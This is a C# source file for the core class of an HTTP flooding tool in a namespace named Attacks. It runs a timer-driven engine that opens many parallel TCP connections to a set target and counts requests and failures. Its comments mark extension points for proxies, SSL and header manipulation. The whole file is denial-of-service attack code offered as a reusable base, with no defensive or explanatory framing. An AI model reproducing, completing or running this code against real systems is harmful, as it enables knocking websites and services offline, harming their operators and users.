using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using GAS.Core.AttackInformation;
using Timer = System.Timers.Timer;

namespace GAS.Core.Attacks {
    /// <summary>
    /// Base class for http flooders
    /// </summary>
    public abstract class AsyncHttpFlooderCore {
        #region Vars
        private bool _active;
        private double _interval;
        private ElapsedEventHandler[] _handlers;
        private int _maxTasks = 64;
        private int _taskCount = 0;
        private int _threads = 1;
        private IPEndPoint _target;
        #region Implementations
        private Func<object, Task<TcpClient>> _getTcpClient;
        private Func<Stream, NetworkStream, object, Task<bool>> _receiveResponse;
        private Func<Stream, NetworkStream, object, Task<bool>> _sendBody;
        private Func<Stream, NetworkStream, object, Task<bool>> _sendHeaders;
        private Func<NetworkStream, object, Task<Stream>> _wrapStream;
        private Func<object> _getToken;
        #endregion
        #region Synchronization
        private Timer _syncTimer;
        private readonly object _consoleLocker = 0;
        private IAttackInfo _attackInfo;
        private readonly ManualResetEvent _exitEvent = new ManualResetEvent( true );
        /// <summary>
        /// Stopwatch for delays/similar
        /// </summary>
        protected readonly Stopwatch SyncWatch;
        /// <summary>
        /// Lock object for TaskCount
        /// </summary>
        protected readonly object TaskCountLocker = 0;
        /// <summary>
        /// Lock object for Requested
        /// </summary>
        protected readonly object RequestedLocker = 0;
        /// <summary>
        /// Lock object for Failed
        /// </summary>
        protected readonly object FailedLocker = 0;
        #endregion
        #endregion
        #region Settings & stats
        /// <summary>
        /// Is attack running
        /// </summary>
        public bool Active {
            get { return this._active; }
        }

        /// <summary>
        /// Attack Info
        /// </summary>
        public virtual IAttackInfo AttackInfo {
            get { return this._attackInfo; }
            set {
                if ( this._active )
                    throw new InvalidOperationException( "Target changing is not allowed while attacking" );
                this._attackInfo = value; ;
            }
        }


        /// <summary>
        /// Number of running tasks
        /// </summary>
        public int TaskCount {
            get {
                return this._taskCount;
            }
            protected set {
                this._taskCount = value;
                if ( value < 0 )
                    throw new ArgumentOutOfRangeException( "value", this._taskCount, "TaskCount < 0" );
                if ( value == 0 )
                    this._exitEvent.Set();
            }
        }
        /// <summary>
        /// Number of || invoked connection requests
        /// </summary>
        public int Threads {
            get {
                return this._threads;
            }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Thread setting not allowed while attacking" );
                if ( value < 1 )
                    throw new ArgumentOutOfRangeException( "value", "Threads must be > 0" );
                this._threads = value;
            }
        }
        /// <summary>
        /// Requested counter
        /// </summary>
        public int Requested { get; protected set; }
        /// <summary>
        /// Failed counter
        /// </summary>
        public int Failed { get; protected set; }
        /// <summary>
        /// Limit of parallel connections
        /// </summary>
        public int MaxTasks {
            get { return this._maxTasks; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Task limit setting is not allowed while attacking" );
                if ( value < 1 )
                    throw new ArgumentOutOfRangeException( "value", "MaxTasks must be > 0" );
                this._maxTasks = value;
            }
        }
        /// <summary>
        /// Timer interval in ms. Values &lt; 15 don't work on Windows.
        /// </summary>
        public double Interval {
            get { return _interval; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Interval setting is not allowed while attacking" );
                if ( value <= 0 )
                    throw new ArgumentOutOfRangeException( "value", "Interval must be > 0" );
                if ( this._interval == value ) return;
                this._interval = value;
                this._syncTimer.Interval = value;
            }
        }
        #endregion
        #region Constructor
        /// <summary>
        /// Constructor
        /// </summary>
        public AsyncHttpFlooderCore() {
            _syncTimer = new Timer();
            this.SyncWatch = new Stopwatch();
            this._getTcpClient = this.GetTcpClientD;
            this.WrapStream = this.WrapStreamD;
            this._sendHeaders = this.SendHeadersD;
            this._sendBody = this.SendBodyD;
            this._receiveResponse = this.ReceiveResponseD;
            this._getToken = this.GetTokenD;
        }
        #endregion
        #region Controls
        /// <summary>
        /// Starts execution
        /// </summary>
        public virtual void Start() {
            lock ( this ) {
                if ( this._active ) throw new InvalidOperationException( "Attack already running" );
                this._active = true;
            }
            _syncTimer.Start();
            _handlers = new ElapsedEventHandler[ this.Threads ];
            for ( var i = 0; i < this.Threads; i++ ) {
                _handlers[ i ] = this.AttackCore;
                this._syncTimer.Elapsed += _handlers[ i ];
            }
            this.SyncWatch.Restart();
        }
        /// <summary>
        /// Stops execution
        /// </summary>
        public virtual void Stop() {
            lock ( this ) {
                if ( !this.Active ) throw new InvalidOperationException( "Attack not running" );
                this._active = false;
            }
            _syncTimer.Stop();
            bool running;
            lock ( this.TaskCountLocker ) running = this._taskCount > 0;
            if ( !running ) return;
            this._exitEvent.Reset();
            this._exitEvent.WaitOne();
            for ( var i = 0; i < this.Threads; i++ )
                this._syncTimer.Elapsed -= _handlers[ i ];
        }
        #endregion
        #region Heart
        /// <summary>
        /// Heart
        /// </summary>
        private async void AttackCore( object sender, ElapsedEventArgs e ) {
            if ( this.TaskCount >= this.MaxTasks ) return;
            IncrementTaskCount();
            lock ( this.RequestedLocker )
                ++this.Requested;
            try {
                var token = this.GetToken();
                using ( var t = await this.GetTcpClient( token ) ) {
                    await t.ConnectAsync( this.AttackInfo.Target.Address, this.AttackInfo.Target.Port );
                    if ( !t.Connected ) return;
                    using ( var basestream = t.GetStream() ) {
                        using ( var stream = await this.WrapStream( basestream, token ) ) {
                            if ( !await this.SendHeaders( stream, basestream, token ) ) return;
                            if ( !( this.Active && t.Connected ) ) return;
                            if ( !await this.SendBody( stream, basestream, token ) ) return;
                            await stream.FlushAsync();
                            if ( !( this.Active && t.Connected ) ) return;
                            if ( !await this.ReceiveResponse( stream, basestream, token ) ) return;
                            if ( !( this.Active && t.Connected ) ) return;
                            stream.Close();
                            //manually close stream. using(...){} does not dispose it properly in some cases
                        }
                        basestream.Close();
                    }
                    t.Close();
                }
            }
            catch {
                lock ( this.FailedLocker )
                    ++this.Failed;
                this.dw( "Handling exception" );
            }
            finally {
                DecrementTaskCount();
            }
        }
        /// <summary>
        /// Wrapper for debugging purposes
        /// </summary>
        private void DecrementTaskCount() {
            this.dw( this.TaskCount.ToString() );
            lock ( this.TaskCountLocker )
                --this.TaskCount;
        }
        /// <summary>
        /// Wrapper for debugging purposes
        /// </summary>
        private void IncrementTaskCount() {
            this.dw( this.TaskCount.ToString() );
            lock ( this.TaskCountLocker )
                ++this.TaskCount;
        }
        #endregion
        #region Core
        /// <summary>
        /// Token generator
        /// </summary>
        public Func<object> GetToken {
            get { return this._getToken; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Implementation changing is not allowed while attacking" );
                this._getToken = value;
            }
        }
        /// <summary>
        /// GetToken default implementation
        /// </summary>
        /// <returns></returns>
        private object GetTokenD() {
            return null;
        }

        /// <summary>
        /// Gets client for connecting.
        /// Change to use proxies/similar stuff
        /// </summary>
        /// <param name="token">token to use in async funcs</param>
        /// <returns>TcpClient to use</returns>
        public Func<object, Task<TcpClient>> GetTcpClient {
            get { return this._getTcpClient; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Implementation changing is not allowed while attacking" );
                this._getTcpClient = value;
            }
        }
        /// <summary>
        /// Default GetTcpClient implementation
        /// Change to use proxies/similar stuff
        /// </summary>
        /// <param name="token">token to use in async funcs</param>
        /// <returns>TcpClient to use</returns>
        private async Task<TcpClient> GetTcpClientD( object token ) {
            this.dw( "Made new TcpClient" );
            return new TcpClient();
        }

        /// <summary>
        /// Receives response
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Has operation succeed</returns>
        public Func<Stream, NetworkStream, object, Task<bool>> ReceiveResponse {
            get { return this._receiveResponse; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Implementation changing is not allowed while attacking" );
                this._receiveResponse = value;
            }
        }
        /// <summary>
        /// ReceiveResponse default implementation
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Has operation succeed</returns>
        private async Task<bool> ReceiveResponseD( Stream stream, NetworkStream basestream, object token ) {
            this.dw( "Receiving body" );
            return true;
        }

        /// <summary>
        /// Sends body.
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Has operation succeed</returns>
        public Func<Stream, NetworkStream, object, Task<bool>> SendBody {
            get { return this._sendBody; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Implementation changing is not allowed while attacking" );
                this._sendBody = value;
            }
        }
        /// <summary>
        /// SendBody default implementation
        /// </summary>
        /// <param name="stream"></param>
        /// <param name="basestream"></param>
        /// <param name="token"></param>
        /// <returns></returns>
        private async Task<bool> SendBodyD( Stream stream, NetworkStream basestream, object token ) {
            this.dw( "Sending body" );
            return true;
        }

        /// <summary>
        /// Sends headers.
        /// Change to do magic with headers.
        /// Don't forget to append double \r\n to end
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Has operation succeed</returns>
        public Func<Stream, NetworkStream, object, Task<bool>> SendHeaders {
            get { return this._sendHeaders; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Implementation changing is not allowed while attacking" );
                this._sendHeaders = value;
            }
        }
        /// <summary>
        /// SendHeaders default implementation
        /// Change to do magic with headers.
        /// Don't forget to append double \r\n to end
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Has operation succeed</returns>
        private async Task<bool> SendHeadersD( Stream stream, NetworkStream basestream, object token ) {
            this.dw( "Sending headers" );
            return true;
        }

        /// <summary>
        /// Prepares stream for transfer.
        /// Gets stream from raw stream after connection
        /// Change to use ssl/similar.
        /// </summary>
        /// <param name="getStream">input stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>stream which will be used to transfer data</returns>
        public Func<NetworkStream, object, Task<Stream>> WrapStream {
            get { return this._wrapStream; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Implementation changing is not allowed while attacking" );
                this._wrapStream = value;
            }
        }

        /// <summary>
        /// WrapStream default implementation
        /// </summary>
        /// <param name="getStream">input stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>stream which will be used to transfer data</returns>
        private async Task<Stream> WrapStreamD( NetworkStream getStream, object token ) {
            this.dw( "Wrapping stream" );
            return getStream;
        }
        /// <summary>
        /// Just for debugging. 
        /// </summary>
        /// <param name="s"></param>
        private void dw( string s ) {
        }
        #endregion
    }
}
